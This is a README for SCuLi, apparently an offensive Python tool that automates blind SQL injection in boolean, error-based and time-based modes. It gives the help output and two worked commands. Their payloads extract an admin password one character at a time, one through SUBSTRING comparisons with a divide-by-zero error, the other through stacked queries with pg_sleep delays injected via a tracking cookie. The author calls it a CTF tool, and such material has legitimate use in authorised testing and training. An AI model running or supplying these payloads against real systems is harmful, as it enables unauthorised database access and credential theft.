# SCuLi

A beautiful named tool to perform blind SQLi injection.

Are implemented in this version:
- Basic conditionnal responses *sync* and *async* mode.
- Error based *sync* and *async* mode.
- Time based *sync* and *async* mode.

Future developpements:
- SQLi by *OAST*.
- Interactive setup of *SCuLi*.

### Notes for users

You can modify the ALPHABET in `code/utils.py`, by default alphabet is `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ _-&#$!%*~<>`.

Be careful when setting `--speed` option, `len(ALPHABET)*password_size` requests are sent in few seconds.

When using `--delay` and `--speed`, the delay is exectued between each password index exfiltration.


# Install

No requirements except a working `python3`.

```bash
git clone https://github.com/Baabbou/SCuLi.git
cd SCuLi
pip3 install -r requirements.txt
```

# Uses

**Help:**
```bash
$ python3 ./SCuLi.py --help
usage: SCuLi [-h] [-d DELAY] [--cookie COOKIE] [--proxy PROXY] [-i INPUT] [-s] URL type method payload

A blind SQL Injector.

positional arguments:
  URL
  type                  Can be: basic, error, time, xOAST
  method                Can be: GET or POST
  payload               Example: `' AND SUBSTR((SELECT <data> FROM <table> WHERE <filter>='<value>'),<index>,1)='<char>'--`

options:
  -h, --help            show this help message and exit
  -d DELAY, --delay DELAY
                        In seconds. Example: `0.5`
  --cookie COOKIE       Example: `PHPSESSID=JWT; csrf=MD5-STUFF`
  --proxy PROXY         Example: `http://127.0.0.1:8080`
  -i INPUT, --input INPUT
                        Example: `./example_input.json`
  -s, --speed           Request are now made as async requests

Don't hack good people pls.
```
<br>

**Simple Example:**
```bash
$ cat input.json
{
    "params": {
        "username": "admin<>",
        "password": "p4ssw0rd"
    }
}

$ python3 ./SCuLi.py "http://vulnerable.net/" basic GET "' AND SUBSTRING((SELECT passwd from users where uname='admin'),<index>,1)='<char>' AND 1=TO_CHAR(1/0)--" -i "input.json" -d 1.5
```
<br>

**Complex example:**
```bash
$ cat input.json
{
    "params": {},
    "cookie": "TrackingId=sqlihere<>; session=MD5-Stuff"
}

$ python3 ./SCuLi.py "https://vulnerable.net/login" time GET "abc'%3b SELECT CASE WHEN (SUBSTRING((SELECT passwd from users where uname='admin'),<index>,1)='<char>') THEN pg_sleep(3) ELSE pg_sleep(0) END --" -i input.json --proxy "http://127.0.0.1:8080" --speed
```
<br>

# Warning

Don't use it for bad things, it's just a CTF tool.
It's also still in developement so don't be rude with it :)

<br>


# Contact

Don't contact me.
